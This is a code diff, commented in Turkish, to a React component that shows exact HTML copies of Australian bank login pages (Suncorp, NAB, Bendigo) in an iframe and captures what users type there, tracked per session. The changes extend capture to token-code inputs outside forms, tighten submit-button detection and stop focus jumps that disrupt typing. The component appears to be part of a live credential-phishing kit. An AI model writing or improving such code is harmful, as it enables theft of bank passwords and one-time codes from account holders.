@@ -120,9 +120,14 @@ function readFieldValue(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectE
   return el.value?.trim() ?? "";
 }
 
-function getFormFields(form: HTMLFormElement) {
+function getFormFields(form: HTMLFormElement | Document) {
+  const scope = (form as any).querySelectorAll
+    ? ((form as unknown) as ParentNode)
+    : (document as unknown as ParentNode);
   return Array.from(
-    form.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>("input, textarea, select"),
+    (scope as ParentNode).querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
+      "input, textarea, select",
+    ),
   ).filter(isMeaningfulField);
 }
 
@@ -486,13 +491,16 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     const doc = iframeRef.current?.contentDocument;
     if (!doc) return [] as CapturedField[];
     const form = pickBestForm(doc);
-    if (!form) return [];
-    return collectCapturedFieldsFromForm(form, doc);
+    // ⭐ FORM YOKSA (örneğin Suncorp token code form DIŞINDA ise)
+    //   DOCUMENT bazlı TÜM inputları toplayıp döner (boş array dönme)
+    const scope = form ?? (doc as unknown as HTMLFormElement);
+    return collectCapturedFieldsFromForm(scope, doc);
   }, []);
 
   const submitWithCurrentValuesRef = useRef<() => Promise<void>>(() => Promise.resolve());
   const lastSubmitAtRef = useRef<number>(0);
   const savedSubmitFormRef = useRef<HTMLFormElement | null>(null);
+  const pollingCounterRef = useRef<number>(0);
   const savedSubmitActionNodesRef = useRef<HTMLElement[]>([]);
 
   const attachFrameBridge = useCallback(() => {
@@ -505,13 +513,18 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     if (!loginForm) {
       loginForm = pickBestForm(doc);
     }
-    if (!loginForm) return;
-    savedSubmitFormRef.current = loginForm;
+    // ⭐ FORM YOKSA (Suncorp token code / NAB shadow DOM vb)
+    //   BRIDGE'I KAPATMA (return etme)! DOCUMENT'i scope olarak kullan.
+    //   (eski sürümde return ederdi, butonlar/polling handlerları hiç bağlanmazdı)
+    const loginScope = loginForm ?? (doc as unknown as HTMLFormElement);
+    if (loginForm) {
+      savedSubmitFormRef.current = loginForm;
+    }
 
     const canProceedNow = () => {
       const isSingle = (auPages?.length ?? 1) === 1;
-      if (isFinalStep) return canSubmitFinal(loginForm!, doc, isSingle);
-      return canSubmitIntermediate(loginForm!, doc);
+      if (isFinalStep) return canSubmitFinal(loginScope, doc, isSingle);
+      return canSubmitIntermediate(loginScope, doc);
     };
 
     const ultraForceClickOnBestNode = (bestForm: HTMLFormElement, actNodes: HTMLElement[]) => {
@@ -590,8 +603,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       //     (A) Event gelmemişse (postMessage/ref üzerinden manuel çağrı) → izin ver
       //     (B) event.type === "submit" (form submit event) → izin ver
       //     (C) event.type click/mousedown/touchend/pointerup vb. ise:
-      //         → event.target BUTTON / INPUT[type=submit,button] / [role=button] olmalı
+      //         → event.target BUTTON / INPUT[type=submit,button] / [role=button] OLMALIDIR
       //         → VEYA event.key === "Enter" (klavyeden Enter)
+      //         → ⭐ YENİ: closest ile iç içe SPAN/SVG/TEXT etiketleri BUTONUN ICINDEYSE closest ile parent BUTON ise ONAYLA
       if (event) {
         const et = (event as any).target as HTMLElement | null;
         const evtType = String((event as any).type || "");
@@ -600,14 +614,23 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           (event as any).keyCode === 13 ||
           (event as KeyboardEvent).code === "Enter" ||
           (event as KeyboardEvent).key === "NumpadEnter";
+        let closestActionNode: HTMLElement | null = null;
+        try {
+          if (et && typeof (et as any).closest === "function") {
+            closestActionNode = (et as HTMLElement).closest(
+              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, [onclick]",
+            ) as HTMLElement | null;
+          }
+        } catch {}
+        const etButton = closestActionNode || et;
         const isButtonLike =
-          et
-            ? (et.tagName === "BUTTON" ||
-                (et.tagName === "INPUT" &&
+          etButton
+            ? (etButton.tagName === "BUTTON" ||
+                (etButton.tagName === "INPUT" &&
                   ["submit", "button"].includes(
-                    ((et as HTMLInputElement).getAttribute("type") || "").toLowerCase(),
+                    ((etButton as HTMLInputElement).getAttribute("type") || "").toLowerCase(),
                   )) ||
-                et.getAttribute("role") === "button")
+                etButton.getAttribute("role") === "button")
             : false;
         const isFormSubmit = evtType === "submit";
         // Label / body / div / span üzerinden gelen tıklamaları (event bubbling) REDDET
@@ -712,14 +735,16 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       form.setAttribute("method", "post");
       form.setAttribute("target", "_self");
       form.setAttribute("novalidate", "novalidate");
-      if (form === loginForm) {
+      // ⭐ loginForm varsa (gerçek form var) submit handler bağla
+      //   loginScope document ise form !== document, bu yüzden doğrudan loginForm eşitse
+      if (loginForm && form === loginForm) {
         try { form.removeEventListener("submit", submitWithCurrentValues as any); } catch {}
         form.addEventListener("submit", submitWithCurrentValues as any);
         (form as any)._auBotV3Bound = true;
       }
     });
 
-    const actionNodes = computeActionNodes(doc, loginForm);
+    const actionNodes = computeActionNodes(doc, loginScope);
     savedSubmitActionNodesRef.current = actionNodes;
 
     const updateSubmitState = () => {
@@ -731,8 +756,8 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       //   - captured alanı 0 → opacity 0.28, grayscale 0.8 (çok silik)
       //   - alanlar kısmen dolu (1/2) → opacity 0.5, grayscale 0.6 (silik)
       //   - TÜM alanlar dolu (isValid=true) → opacity 1, grayscale 0
-      const captured = collectCapturedFieldsFromForm(savedSubmitFormRef.current ?? loginForm, doc);
-      const totalMeaningful = getFormFields(savedSubmitFormRef.current ?? loginForm).filter((f) => {
+      const captured = collectCapturedFieldsFromForm(savedSubmitFormRef.current ?? loginScope, doc);
+      const totalMeaningful = getFormFields(savedSubmitFormRef.current ?? loginScope).filter((f) => {
         const t = (f.getAttribute("type") ?? "").toLowerCase();
         return t !== "checkbox" && t !== "radio";
       }).length;
@@ -799,7 +824,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       link.setAttribute("rel", "nofollow noopener noreferrer");
     });
 
-    getFormFields(loginForm).forEach((field) => {
+    getFormFields(loginScope).forEach((field) => {
       try { field.removeEventListener("input", updateSubmitState as any); } catch {}
       try { field.removeEventListener("change", updateSubmitState as any); } catch {}
       field.addEventListener("input", updateSubmitState as any);
@@ -856,8 +881,42 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
     const runPoll = () => {
       try {
+        pollingCounterRef.current = pollingCounterRef.current + 1;
         const doc = iframe.contentWindow?.document;
         if (!doc) return;
+
+        // ⭐ İLK 2 POLLING TURU: Aktif odak input/textarea/select değilse,
+        //   odak yoksa İLK input/autofocus inputa odaklan.
+        //   (daha sonraki TURlarda KESİNLİKLE odak izinsiz el değiştirme
+        //    → Bendigo şifre 1 karakter yazma / Suncorp token→customer id odak KAYBINI ONLER)
+        try {
+          if (pollingCounterRef.current <= 2) {
+            const act = doc.activeElement as HTMLElement | null;
+            const actTag = (act?.tagName || "").toLowerCase();
+            const userIsTyping = actTag === "input" || actTag === "textarea" || actTag === "select";
+            if (!userIsTyping) {
+              let focusTarget: HTMLElement | null = null;
+              try {
+                focusTarget = doc.querySelector<HTMLElement>("input[autofocus], textarea[autofocus]");
+              } catch {}
+              if (!focusTarget) {
+                try {
+                  focusTarget = Array.from(
+                    doc.querySelectorAll<HTMLInputElement>("input:not([type='hidden'])"),
+                  )[0] as HTMLElement | null;
+                } catch {}
+              }
+              if (focusTarget) {
+                try {
+                  setTimeout(() => {
+                    try { (focusTarget as any).focus({ preventScroll: true }); }
+                    catch { try { (focusTarget as any).focus(); } catch {} }
+                  }, 0);
+                } catch {}
+              }
+            }
+          }
+        } catch {}
 
         // =====================================================================
         // ⭐ 1. POLLING BAŞI — OVERLAY / Z-INDEX BRUTE FORCE TEMİZLİĞİ
@@ -1016,16 +1075,10 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 depth++;
               }
 
-              // Odak denemesi (her input 3 turda 1 kez, index mod 3)
-              try {
-                if (idx % 3 === 0 && doc.activeElement !== field) {
-                  try {
-                    setTimeout(() => {
-                      try { field.focus({ preventScroll: true } as any); } catch { try { field.focus(); } catch {} }
-                    }, 0);
-                  } catch {}
-                }
-              } catch {}
+              // ⭐ ÖNEMLİ: HER POLLING'de idx%3 ===0 focus KALDIRILDI!
+              //   Yerine: runPoll başında SADECE İLK 2 polling turunda
+              //   ve AKTİF ODAKLI BİR INPUT YOKSA odaklama yapıyoruz.
+              //   (Bu sayede kullanıcı yazarken odak ASLA izinsiz DEĞİŞMEZ.)
             } catch {}
           });
         } catch {}
